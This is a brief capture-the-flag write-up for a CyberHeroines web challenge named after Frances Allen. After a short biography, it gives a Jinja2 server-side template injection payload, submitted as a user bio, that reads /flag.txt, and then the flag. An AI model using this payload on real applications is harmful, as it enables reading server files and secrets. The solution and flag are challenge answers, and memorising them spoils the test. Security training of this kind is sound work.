# France Allen

## Prompt

[Frances Elizabeth Allen](https://en.wikipedia.org/wiki/Frances_Allen) (August 4, 1932 – August 4, 2020) was an American computer scientist and pioneer in the field of optimizing compilers. Allen was the first woman to become an IBM Fellow, and in 2006 became the first woman to win the Turing Award. Her achievements include seminal work in compilers, program optimization, and parallelization. She worked for IBM from 1957 to 2002 and subsequently was a Fellow Emerita. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Frances_Allen)

Chal: Build your best attack against this [webapp](https://cyberheroines-web-srv5.chals.io/) and inspire [the first woman to win the Turing Award](https://www.youtube.com/watch?v=NjoU-MjCws4)

## Solution

The webapp suffers a [SSTI](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/) vulnerability that can execute arbitrary code by submitting ```{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/flag.txt').read()}}``` as the bio.

flag: ``chctf{th3re_W4s_n3v3r_a_d0ubt_th4t_1t_w4s_1mp0rt4nt}``